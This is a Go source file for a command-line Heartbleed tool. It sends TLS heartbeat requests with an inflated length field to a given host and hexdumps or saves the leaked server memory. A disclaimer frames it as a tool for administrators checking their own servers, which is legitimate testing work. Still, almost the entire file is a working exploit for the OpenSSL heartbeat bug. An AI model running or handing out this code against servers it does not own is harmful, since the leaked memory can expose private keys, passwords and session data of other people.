// Copyright 2014 The Go-TLSHB Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

package main

import (
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
	"time"
)

const disclaimer = `
This program was written to help system administrators test their servers for
the OpenSSL "heartbleed" vulnerability. The author is not responsible for any
damages as a result of using this tool (may eat your data, etc.) or for any
misuse of this tool for malicious purposes.
`

var (
	nbytes  = flag.Int("n", 16, "number of bytes to request")
	output  = flag.String("o", "", "write binary data to the specified file")
	quiet   = flag.Bool("q", false, "quiet, use exit code to report server status (0=safe)")
	timeout = flag.Duration("t", 5*time.Second, "i/o timeout")
)

func init() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "usage: %s [options] host:port\n\n", os.Args[0])
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, disclaimer)
	}
	if flag.Parse(); flag.NArg() != 1 {
		flag.Usage()
		os.Exit(2)
	}
}

func main() {
	c, err := Dial("tcp", flag.Arg(0), &Config{InsecureSkipVerify: true})
	if err != nil {
		panic(err)
	}
	defer c.Close()

	info("Connected to %s", flag.Arg(0))
	c.SetDeadline(time.Now().Add(*timeout))

	if _, err := c.Heartbeat(nil); err != nil {
		info("Server does not support TLS heartbeats :)")
		if isTimeout(err) || isUnexpected(err) {
			return
		}
		panic(err)
	}

	info("Server supports TLS heartbeats, requesting %d bytes...", *nbytes)
	b, err := c.Heartbleed(*nbytes)
	if len(b) == 0 && err != nil {
		info("Server is not vulnerable :)")
		if err == io.EOF || isTimeout(err) {
			return
		}
		panic(err)
	}

	if *output != "" {
		ioutil.WriteFile(*output, b, 0666)
	}
	if !*quiet {
		w := hex.Dumper(os.Stdout)
		w.Write(b)
		w.Close()
	}
	info("Server is vulnerable :(")
	if err != nil {
		panic(err)
	}
	os.Exit(1)
}

func info(format string, a ...interface{}) {
	if !*quiet {
		fmt.Fprintf(os.Stderr, format+"\n", a...)
	}
}

func isTimeout(err error) bool {
	e, ok := err.(net.Error)
	return ok && e.Timeout()
}

func isUnexpected(err error) bool {
	e, ok := err.(*net.OpError)
	return ok && e.Err == alertUnexpectedMessage
}

func (c *Conn) Heartbeat(b []byte) ([]byte, error) {
	io.ReadFull(rand.Reader, c.tmp[:16])
	return c.heartbeat(len(b), b, c.tmp[:16])
}

func (c *Conn) Heartbleed(n int) ([]byte, error) {
	return c.heartbeat(n, nil, nil)
}

const (
	recordTypeHeartbeat recordType = 24
	heartbeatRequest    byte       = 1
	heartbeatResponse   byte       = 2
)

func (c *Conn) heartbeat(n int, payload, padding []byte) ([]byte, error) {
	if err := c.Handshake(); err != nil {
		return nil, err
	}

	buf := make([]byte, 3, 3+len(payload)+len(padding))
	buf[0] = heartbeatRequest
	buf[1] = byte(n >> 8)
	buf[2] = byte(n)
	buf = append(append(buf, payload...), padding...)

	c.out.Lock()
	defer c.out.Unlock()
	c.writeRecord(recordTypeHeartbeat, buf)

	const maxConsecutiveEmptyRecords = 100
	for emptyRecordCount := 0; emptyRecordCount <= maxConsecutiveEmptyRecords; emptyRecordCount++ {
		for c.hb == nil && c.error() == nil {
			if err := c.readRecord(recordTypeHeartbeat); err != nil {
				// Soft error, like EAGAIN
				return nil, err
			}
		}
		var b []byte
		if c.hb != nil {
			b = c.hb.data[c.hb.off:]
			c.hb = nil
			if len(b) < 1+2+16 || b[0] != heartbeatResponse {
				b = nil
			} else {
				b = b[3 : len(b)-16]
			}
		}
		return b, c.error()
	}
	return nil, io.ErrNoProgress
}
